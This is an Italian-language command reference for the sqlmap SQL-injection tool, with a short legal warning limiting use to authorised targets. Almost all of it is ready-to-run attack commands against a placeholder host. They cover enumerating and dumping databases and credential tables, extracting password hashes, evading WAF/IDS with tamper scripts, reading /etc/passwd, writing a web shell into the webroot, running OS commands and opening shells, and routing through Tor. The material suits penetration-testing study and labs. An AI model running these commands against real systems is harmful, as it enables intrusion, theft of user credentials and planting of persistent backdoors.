# SQLmap — Guida ai Principali Comandi e Test

> **Avviso legale:** SQLmap è uno strumento per il rilevamento e l'exploit di vulnerabilità SQL injection. Utilizzarlo esclusivamente su applicazioni di cui si possiede l'autorizzazione esplicita. L'uso non autorizzato è illegale.

---

## 1. Installazione

### Su Kali Linux (già incluso)
```bash
sqlmap --version
```

### Installazione manuale
```bash
apt update && apt install -y sqlmap
```

### Da sorgente (versione aggiornata)
```bash
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
python3 sqlmap.py --version
```

---

## 2. Sintassi generale

```
sqlmap -u <URL> [opzioni]
```

---

## 3. Test di base

### Test su URL con parametro GET
```bash
sqlmap -u "http://target.com/page.php?id=1"
```

### Test con più parametri
```bash
sqlmap -u "http://target.com/page.php?id=1&cat=2"
```

### Specificare il parametro da testare
```bash
sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id
```

### Test su richiesta POST
```bash
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=1234"
```

### Test su richiesta con cookie (sessione autenticata)
```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"
```

### Test con header personalizzato
```bash
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Custom-Header: valore"
```

### Test su URL HTTPS
```bash
sqlmap -u "https://target.com/page.php?id=1"
```

---

## 4. Usare una richiesta HTTP salvata (da Burp Suite)

### Salvare la richiesta da Burp e usarla con SQLmap
```bash
sqlmap -r richiesta.txt
```

> Il file `richiesta.txt` contiene la richiesta HTTP raw copiata da Burp Suite.

---

## 5. Rilevamento del database

### Rilevare il DBMS in uso
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql
```

### Forza il tipo di DBMS (salta il rilevamento automatico)
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbms=postgresql
```

Valori supportati: `mysql`, `mssql`, `oracle`, `postgresql`, `sqlite`, `access`, `firebird`, `db2`

---

## 6. Enumerazione

### Elencare tutti i database
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

### Elencare le tabelle di un database
```bash
sqlmap -u "http://target.com/page.php?id=1" -D nome_db --tables
```

### Elencare le colonne di una tabella
```bash
sqlmap -u "http://target.com/page.php?id=1" -D nome_db -T utenti --columns
```

### Estrarre il contenuto di una tabella
```bash
sqlmap -u "http://target.com/page.php?id=1" -D nome_db -T utenti --dump
```

### Estrarre solo alcune colonne
```bash
sqlmap -u "http://target.com/page.php?id=1" -D nome_db -T utenti -C username,password --dump
```

### Estrarre tutte le tabelle di tutti i database
```bash
sqlmap -u "http://target.com/page.php?id=1" --dump-all
```

---

## 7. Utenti e privilegi del database

### Ottenere l'utente corrente del DB
```bash
sqlmap -u "http://target.com/page.php?id=1" --current-user
```

### Ottenere il database corrente
```bash
sqlmap -u "http://target.com/page.php?id=1" --current-db
```

### Elencare gli utenti del DB
```bash
sqlmap -u "http://target.com/page.php?id=1" --users
```

### Elencare le password degli utenti del DB (hash)
```bash
sqlmap -u "http://target.com/page.php?id=1" --passwords
```

### Verificare se l'utente è DBA
```bash
sqlmap -u "http://target.com/page.php?id=1" --is-dba
```

### Ottenere i privilegi dell'utente
```bash
sqlmap -u "http://target.com/page.php?id=1" --privileges
```

---

## 8. Tecniche di injection

### Specificare la tecnica manualmente
```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

| Codice | Tecnica                        |
|--------|--------------------------------|
| `B`    | Boolean-based blind            |
| `E`    | Error-based                    |
| `U`    | UNION query-based              |
| `S`    | Stacked queries                |
| `T`    | Time-based blind               |
| `Q`    | Inline queries                 |

### Esempio: solo time-based blind
```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=T
```

---

## 9. Livelli e rischio

### Aumentare il livello di test (1-5, default 1)
```bash
sqlmap -u "http://target.com/page.php?id=1" --level=3
```

### Aumentare il rischio dei payload (1-3, default 1)
```bash
sqlmap -u "http://target.com/page.php?id=1" --risk=2
```

### Test approfondito (massimo)
```bash
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

---

## 10. Evasione WAF/IDS

### Usare un tamper script
```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page.php?id=1" --tamper=between
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase
```

### Combinare più tamper
```bash
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase
```

### Rallentare le richieste (anti-rate-limit)
```bash
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

### Aggiungere un random delay
```bash
sqlmap -u "http://target.com/page.php?id=1" --random-agent --delay=1
```

### Usare un User-Agent random
```bash
sqlmap -u "http://target.com/page.php?id=1" --random-agent
```

### Listare tutti i tamper disponibili
```bash
sqlmap --list-tampers
```

---

## 11. Accesso al filesystem e OS

> Richiedono privilegi elevati sul DB (es. DBA su MySQL con FILE privilege)

### Leggere un file dal server
```bash
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
```

### Scrivere un file sul server (es. web shell)
```bash
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Eseguire comandi OS tramite SQL
```bash
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="id"
```

### Aprire una shell OS interattiva
```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

### Aprire una shell SQL interattiva
```bash
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

---

## 12. Proxy e anonimato

### Usare Burp Suite come proxy
```bash
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

### Usare Tor
```bash
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5
```

---

## 13. Output e sessioni

### Salvare i risultati
```bash
sqlmap -u "http://target.com/page.php?id=1" --output-dir=./risultati
```

### Rispondere automaticamente "sì" a tutte le domande
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```

### Modalità verbose (0-6)
```bash
sqlmap -u "http://target.com/page.php?id=1" -v 3
```

---

## 14. Esempi completi per lab

### Test completo su parametro GET
```bash
sqlmap -u "http://target.com/page.php?id=1" \
  --batch --dbs --level=3 --risk=2 \
  --random-agent -v 2
```

### Dump credenziali da tabella utenti
```bash
sqlmap -u "http://target.com/page.php?id=1" \
  -D webapp -T users -C username,password \
  --dump --batch
```

### Test su form di login POST con evasione WAF
```bash
sqlmap -u "http://target.com/login.php" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 \
  --tamper=space2comment,randomcase \
  --random-agent --batch
```
